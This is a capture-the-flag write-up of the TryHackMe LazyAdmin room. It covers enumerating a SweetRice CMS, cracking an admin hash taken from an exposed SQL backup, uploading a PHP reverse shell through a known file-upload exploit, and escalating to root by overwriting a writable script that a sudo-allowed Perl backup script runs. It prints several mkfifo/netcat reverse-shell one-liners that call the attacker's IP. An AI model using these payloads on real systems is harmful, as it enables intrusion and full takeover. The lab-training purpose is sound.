# LazyAdmin

![An image of Lazy Admin THM room](https://i.imgur.com/3B6uSkg.jpg)

[Play](https://tryhackme.com/room/lazyadmin)

## 1. Enumeration + Exploration

### 1.1. Port Scanning
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.249.26
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 02:40 EDT
Nmap scan report for 10.10.249.26
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.08 seconds
```

Noting too out of the blue here. Let's go to the gobsuter scans for Web Enumeration.

### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.249.26 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/content              (Status: 301) [Size: 314] [--> http://10.10.249.26/content/]

```

Ah. Going to that page, we see the below.

![Content page, SweetRice CMS](https://i.imgur.com/Y3JQljF.png)

Let's enumerate the `/content/` directory in parallel.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.249.26/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q

/images               (Status: 301) [Size: 321] [--> http://10.10.249.26/content/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.249.26/content/js/]    
/inc                  (Status: 301) [Size: 318] [--> http://10.10.249.26/content/inc/]   
/as                   (Status: 301) [Size: 317] [--> http://10.10.249.26/content/as/]    
/_themes              (Status: 301) [Size: 322] [--> http://10.10.249.26/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.249.26/content/attachment/]
```

This gives us a lot to explore. 

### 1.3. Web Exploration
We see the version of the sowftware being used.

![SweetRice CMS version](https://i.imgur.com/tI4jMIH.png)

We also see some backup files as below.

![MySQL backup directory](https://i.imgur.com/H8DcAho.png)

```
┌──(kali㉿kali)-[/tmp]
└─$ cat mysql_bakup_20191129023059-1.5.1.sql 
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (

{some more info}

) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES( {...} "admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44c****\\
  
  {some more information here}
  
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>   
```
### 1.4. Hash Cracking
We get the hash, and we can now use an online tool like CrackStation 

![Hash cracking using CrackStation](https://i.imgur.com/PR00S0g.png)

`42f749ade7f9e195bf475f37a44****: ***********`

And voila! We have the creds. The username is also mentioned closely ;)

Now what?

### 1.5. More Web Exploration
There's one link that we missed out on before.

Let's go to: `/content/as/`

![Login page for admin](https://i.imgur.com/KhaWHVq.png)

Using the credentials as found before, we are in!


### 1.6. Admin Page
![Admin page of SweetRice](https://i.imgur.com/QDWO8I3.png)

![Details and Settings of SweetRice](https://i.imgur.com/ebre2uF.png)

I also found more credentials lying around. These may become important later on.

![Important Database Credentials](https://i.imgur.com/fR3h7hE.png)


Since we have the version and the credentials in hand, I found one epxloit which looks pretty tasty.

[SweetRice 1.5.1 - Arbitrary File Upload](https://www.exploit-db.com/exploits/40716)

Now, we attempt the foothold.

## 2. Foothold

We enter the initial creds found, which we used for logging in.

Also, use [RevShells](https://revshells.com/) to get the `PHP PentestMonkey` shell. 

![SweetRice Exploit](https://i.imgur.com/F0Jryka.png)

NOTE: `.php` did not work. It does not show in the uploads. Renaming it to `.php5` worked.

Also, start up netcat on the selected port, and go to the url given.

![SweetRice Exploit Working](https://i.imgur.com/VIJcmtD.png)


![Getting a shell with the exploit](https://i.imgur.com/SUECOzF.png)

\*in deep hacker voice\* I am in!

## 3. PrivEsc

We so a bit of exploration and we get some more creds. These are the same as what we saw before.
```
www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
cat mysql_login.txt
rice:**********
```

Check sudo permissions.

```
www-data@THM-Chal:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```

Okay backup scripts are usually interesting. Let's see.

```
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

What about the permissions?

```
www-data@THM-Chal:/home/itguy$ ls -la | grep backup
ls -la | grep backup
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
```

We can't edit it. It runs another script named `/etc/copy.sh`. Let's check that out.

```
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

OOF looks like a reverse shell. Can we edit it though?

```
www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

Uh ... its owned by root.

All hope lost? Well, check the permissions XD

Using [RevShells](https://www.revshells.com/), we ge the command,

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.8.184 1337 >/tmp/f`

I tried using nano, but it did not work. No vim either. So, we do `echo` :P

`www-data@THM-Chal:/etc$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.8.184 1234 >/tmp/f" > copy.sh`

Execute it as,

`www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl`

While having a listener setup using netcat. Remember: It needs to be on another port - because we are already using one we connected to before.

![Getting the reverse shell with root permissions](https://i.imgur.com/NnasIBg.png)

And ... we are done!